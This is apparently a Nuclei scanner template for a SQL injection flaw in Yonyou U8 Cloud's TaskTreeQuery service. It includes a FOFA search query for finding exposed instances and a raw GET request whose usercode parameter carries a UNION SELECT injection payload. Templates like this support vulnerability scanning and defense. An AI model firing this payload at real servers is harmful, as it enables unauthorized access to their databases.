id: yonyou-u8-cloud-TaskTreeQuery-sqli

info:
  name: 用友 U8 Cloud TaskTreeQuery - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - todo
  metadata:
    verified: true
    fofa-qeury: app="用友-U8-Cloud" || title=="U8C"
  tags: yonyou,u8cloud,sqli,oa

http:
  - raw:
      - |+
        GET /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211%27+UNION+all+SELECT+1,111*111,3,4,5,6,7,8,9--+ HTTP/1.1
